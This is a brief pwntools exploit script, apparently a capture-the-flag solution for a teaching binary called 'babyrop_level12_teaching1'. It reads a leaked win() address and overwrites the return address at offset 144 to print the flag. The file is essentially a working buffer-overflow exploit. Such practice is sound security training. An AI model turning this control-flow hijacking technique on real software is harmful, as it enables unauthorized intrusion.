#!/usr/bin/python3
from pwn import *
context.clear(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
context.binary = exe = 'babyrop_level12_teaching1'
e = ELF(exe)
# r = ROP(exe)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#p = gdb.debug(['./babyrop_level10_testing1'])
# we can use partial overwrite to bruteforce the address of win
p = process(exe)
p.recvuntil(b'win() will open the flag and send its data to stdout; it is at ')
x = int(p.recvline()[:-2], 16)
payload = p64(x)
p.send(fit({144:payload}))
print(p.clean())
p.close()
